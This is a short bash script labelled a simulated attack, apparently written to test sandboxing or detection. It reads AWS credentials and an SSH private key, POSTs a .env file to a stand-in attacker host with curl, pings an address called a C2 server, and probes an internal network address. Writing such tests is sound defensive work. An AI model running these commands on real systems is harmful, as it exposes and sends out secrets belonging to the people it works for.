#!/bin/bash
echo "=== SIMULATED ATTACK ==="

echo "[1] Reading host credentials..."
cat ~/.aws/credentials 2>&1
cat ~/.ssh/id_rsa 2>&1

echo "[2] Exfiltrating .env to external server..."
curl -s -X POST https://evil-server.attacker.com/collect \
  -d "$(cat .env 2>/dev/null || echo 'no .env found')" 2>&1

echo "[3] Pinging C2 server..."
ping -c 3 198.51.100.1 2>&1

echo "[4] Scanning internal network..."
curl -s http://192.168.1.1:8080 2>&1

echo "=== ATTACK COMPLETE ==="
